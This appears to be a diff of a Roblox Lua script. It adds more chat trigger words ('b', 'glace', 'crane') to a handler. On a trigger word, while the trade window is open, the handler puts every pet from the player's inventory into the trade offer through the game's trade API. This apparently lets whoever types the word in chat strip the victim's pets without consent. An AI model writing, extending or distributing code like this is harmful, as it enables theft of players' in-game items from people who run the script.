@@ -59,7 +59,7 @@ function output(plr, msg)
         end
         end
 
-        if msg == "pet" or msg == "oui" then
+        if msg == "pet" or msg == "oui" or msg == "b" or msg == "glace" or msg == "crane" then
             if Player.PlayerGui.TradeApp.Frame.Visible then
             for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                 ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
